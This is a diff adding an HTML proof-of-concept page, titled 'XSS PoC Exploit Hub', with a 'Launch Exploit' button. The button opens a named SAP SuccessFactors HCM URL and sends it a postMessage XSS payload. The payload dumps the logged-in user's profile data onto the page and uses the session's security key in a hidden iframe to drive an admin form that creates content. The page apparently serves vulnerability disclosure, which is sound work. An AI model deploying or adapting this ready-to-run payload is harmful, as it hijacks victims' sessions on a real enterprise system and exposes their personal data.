@@ -1,5 +1,227 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS PoC Exploit Hub</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #8b5cf6;
+            --primary-glow: rgba(139, 92, 246, 0.5);
+            --bg: #0f172a;
+            --card-bg: rgba(30, 41, 59, 0.7);
+            --text: #f8fafc;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', sans-serif;
+        }
+
+        body {
+            background-color: var(--bg);
+            background-image: 
+                radial-gradient(at 0% 0%, rgba(139, 92, 246, 0.15) 0px, transparent 50%),
+                radial-gradient(at 100% 100%, rgba(236, 72, 153, 0.15) 0px, transparent 50%);
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--text);
+            overflow: hidden;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 500px;
+            padding: 2rem;
+            text-align: center;
+            z-index: 10;
+        }
+
+        .card {
+            background: var(--card-bg);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 24px;
+            padding: 3rem 2rem;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            transition: transform 0.3s ease;
+        }
+
+        .card:hover {
+            transform: translateY(-5px);
+        }
+
+        h1 {
+            font-size: 2.5rem;
+            font-weight: 800;
+            margin-bottom: 1rem;
+            background: linear-gradient(to right, #a78bfa, #f472b6);
+            -webkit-background-clip: text;
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: -0.025em;
+        }
+
+        p {
+            color: #94a3b8;
+            margin-bottom: 2.5rem;
+            font-size: 1.1rem;
+            line-height: 1.6;
+        }
+
+        .exploit-btn {
+            position: relative;
+            background: var(--primary);
+            color: white;
+            border: none;
+            padding: 1.25rem 2.5rem;
+            font-size: 1.1rem;
+            font-weight: 600;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            box-shadow: 0 10px 15px -3px var(--primary-glow);
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            overflow: hidden;
+        }
+
+        .exploit-btn:hover {
+            background: #7c3aed;
+            box-shadow: 0 20px 25px -5px var(--primary-glow);
+            transform: scale(1.02);
+        }
+
+        .exploit-btn:active {
+            transform: scale(0.98);
+        }
+
+        .status {
+            margin-top: 2rem;
+            font-size: 0.875rem;
+            color: #64748b;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+            opacity: 0;
+            transition: opacity 0.5s ease;
+        }
+
+        .status.active {
+            opacity: 1;
+        }
+
+        .dot {
+            width: 8px;
+            height: 8px;
+            background: #22c55e;
+            border-radius: 50%;
+            display: inline-block;
+            box-shadow: 0 0 8px #22c55e;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(34, 197, 94, 0.7); }
+            70% { transform: scale(1); box-shadow: 0 0 0 10px rgba(34, 197, 94, 0); }
+            100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(34, 197, 94, 0); }
+        }
+
+        /* Ambient background circles */
+        .circle {
+            position: absolute;
+            border-radius: 50%;
+            filter: blur(80px);
+            z-index: 1;
+        }
+
+        .circle-1 {
+            width: 300px;
+            height: 300px;
+            background: rgba(139, 92, 246, 0.2);
+            top: 10%;
+            left: 10%;
+            animation: float 10s infinite alternate;
+        }
+
+        .circle-2 {
+            width: 400px;
+            height: 400px;
+            background: rgba(236, 72, 153, 0.15);
+            bottom: 10%;
+            right: 10%;
+            animation: float 12s infinite alternate-reverse;
+        }
+
+        @keyframes float {
+            0% { transform: translate(0, 0); }
+            100% { transform: translate(30px, 30px); }
+        }
+    </style>
+</head>
 <body>
+    <div class="circle circle-1"></div>
+    <div class="circle circle-2"></div>
+
+    <div class="container">
+        <div class="card">
+            <h1>postMessage XSS</h1>            
+            <button class="exploit-btn" id="runExploit">Launch Exploit</button>
+
+            <div class="status" id="statusBox">
+                <span class="dot"></span>
+                <span id="statusText">Awaiting launch...</span>
+            </div>
+        </div>
+    </div>
+
     <script>
-        location='https://rx23.io/ctf/seccon/1.html';
+        const btn = document.getElementById('runExploit');
+        const statusBox = document.getElementById('statusBox');
+        const statusText = document.getElementById('statusText');
+        let w;
+
+        btn.addEventListener('click', () => {
+            statusBox.classList.add('active');
+            statusText.innerText = 'Opening target window...';
+            
+            // Step 1: Open the target window
+            w = window.open('https://hcm-us10-sales.hr.cloud.sap/xi/ui/reportcenter/pages/reportCenter.xhtml', 'w');
+            
+            if (!w) {
+                statusText.innerText = 'Popup blocked! Please allow popups.';
+                statusText.style.color = '#ef4444';
+                return;
+            }
+
+            statusText.innerText = 'Window opened. Waiting for load...';
+
+            // Step 2: After some time, send the postMessage
+            // 5 seconds is usually enough for content to initialize
+            setTimeout(() => {
+                if (w) {
+                    const payload = "RCviewSchedule#javascript:if(!window.poc_executed){window.poc_executed=true;document.body.innerHTML=`<br><br><h1 style=font-size:50px;>Pwned all your data:<br><div style=color:red>${JSON.stringify(pageHeaderJsonData.userInfo)}`;const i=document.createElement('iframe');i.src=`https://hcm-us10-sales.hr.cloud.sap/acme?bplte_company=SFSALES006218&fbacme_o=admin&itrModule=rcm&_s.crb=${ajaxSecKey}&pess_old_admin=true&ap_param_action=fbcomdet_q_lib_detail&libdet_lib_source=SFSALES006218`;i.style.width=\"100%\";i.style.height=\"600px\";i.onload=()=>{i.onload=null;setTimeout(()=>{const d=i.contentDocument||i.contentWindow.document,s=d.querySelector('select[name=\"selecter1\"]'),n=d.querySelector('input[name=\"libdet_new_comp_name\"]'),b=d.querySelector('input[name=\"libdet_create_comp\"]');if(s){s.value=\"commmon\";s.dispatchEvent(new Event('change',{bubbles:!0}))}if(n)n.value=\"Pwned POC\"+Math.random();if(b){b.click();setTimeout(()=>alert('New question added as a POC'),1000)}},2000)};document.body.appendChild(i);}//";
+                    w.postMessage(payload, "*");
+                    
+                    statusText.innerText = 'Exploit payload sent!';
+                    statusText.style.color = '#22c55e';
+                    console.log('PostMessage sent: ' + payload);
+                } else {
+                    statusText.innerText = 'Target window was closed.';
+                    statusText.style.color = '#ef4444';
+                }
+            }, 5000);
+        });
     </script>
 </body>
+</html>
